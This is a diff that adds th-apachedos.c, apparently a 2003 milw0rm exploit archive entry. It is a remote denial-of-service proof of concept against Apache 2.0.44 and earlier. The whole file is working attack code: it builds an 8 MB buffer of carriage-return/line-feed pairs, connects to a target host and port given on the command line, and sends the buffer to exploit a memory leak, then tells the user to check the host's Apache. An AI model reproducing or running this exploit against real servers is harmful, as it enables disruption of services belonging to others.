@@ -1,0 +1,101 @@
+/******** th-apachedos.c ********************************************************
+* *
+* Remote Apache DoS exploit *
+* ------------------------- *
+* Written as a poc for the: *
+* 
+* This program sends 8000000 \n's to exploit the Apache memory leak. *
+* Works from scratch under Linux, as opposed to apache-massacre.c . *
+* 
+* 
+* Daniel Nyström <exce@netwinder.nu> *
+* 
+* - www.telhack.tk - *
+* 
+******************************************************** th-apachedos.c ********/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <sys/socket.h>
+
+
+int main(int argc, char *argv[])
+{
+int sockfd;
+int count;
+char buffer[8000000];
+struct sockaddr_in target;
+struct hostent *he;
+
+if (argc != 3)
+{
+fprintf(stderr, "\nTH-apachedos.c - Apache <= 2.0.44 DoS exploit.");
+fprintf(stderr, "\n----------------------------------------------");
+fprintf(stderr, "\nUsage: %s <Target> <Port>\n\n", argv[0]);
+exit(-1);
+}
+
+printf("\nTH-Apache DoS\n");
+printf("-------------\n");
+printf("-> Starting...\n"); 
+printf("->\n");
+
+// memset(buffer, '\n', sizeof(buffer)); /* testing */
+
+for (count = 0; count < 8000000;) 
+{
+buffer[count] = '\r'; /* 0x0D */
+count++;
+buffer[count] = '\n'; /* 0x0A */
+count++;
+}
+
+if ((he=gethostbyname(argv[1])) == NULL)
+{
+herror("gethostbyname() failed ");
+exit(-1);
+}
+
+memset(&target, 0, sizeof(target));
+target.sin_family = AF_INET;
+target.sin_port = htons(atoi(argv[2]));
+target.sin_addr = *((struct in_addr *)he->h_addr);
+
+printf("-> Connecting to %s:%d...\n", inet_ntoa(target.sin_addr), atoi(argv[2]));
+printf("->\n");
+
+if ((sockfd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
+{
+perror("socket() failed ");
+exit(-1);
+}
+
+if (connect(sockfd, (struct sockaddr *)&target, sizeof(struct sockaddr)) < 0)
+{
+perror("connect() failed ");
+exit(-1);
+}
+
+printf("-> Connected to %s:%d... Sending linefeeds...\n", inet_ntoa(target.sin_addr),
+atoi(argv[2]));
+printf("->\n");
+
+if (send(sockfd, buffer, strlen(buffer), 0) != strlen(buffer))
+{
+perror("send() failed ");
+exit(-1);
+close(sockfd);
+} 
+
+
+close(sockfd);
+
+printf("-> Finished smoothly, check hosts apache...\n\n");
+}
+
+// milw0rm.com [2003-04-11]
